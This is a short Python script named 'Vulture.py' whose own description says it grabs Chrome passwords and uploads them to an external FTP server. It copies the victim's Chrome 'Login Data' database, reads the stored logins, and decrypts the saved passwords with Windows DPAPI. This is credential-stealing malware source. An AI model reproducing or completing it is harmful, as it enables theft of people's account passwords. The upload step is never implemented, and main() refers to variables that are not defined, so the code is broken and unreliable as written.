import sqlite3, win32crypt, getpass, os, ftplib, argparse
from tempfile import gettempdir
from subprocess import Popen
from shutil import copy


class Extractor:


	def __init__(self):
		pass

	def pluck_passwords(self):
		windows_username = os.getlogin()
		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(windows_username)

		copy(PATH, gettempdir())

		PATH = gettempdir() + '\\Login Data'
		conn = sqlite3.connect(PATH)
		cur = conn.cursor()
		results = []
		user_data = None

		try:
			cur.execute('SELECT action_url, username_value, password_value FROM logins')

			user_data = cur.fetchall()

		except Exception:
			print('\nError fetching passwords.')

		for r in user_data:
			password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]

			password = password.decode("utf-8")
			username = r[1]
			host = r[0]


def main():
	parser = argparse.ArgumentParser(description='Vulture.py, used to grab and upload Chrome passwords to an external FTP server.')

	parser.add_argument('-s', nargs='?', help='Server IP or host name')
	parser.add_argument('-u', nargs='?', help='FTP Username')
	parser.add_argument('-p', nargs='?', help='FTP Password')
	args = parser.parse_args()

	args.s = host
	args.u = username
	args.p = password


if __name__ == '__main__':
	main()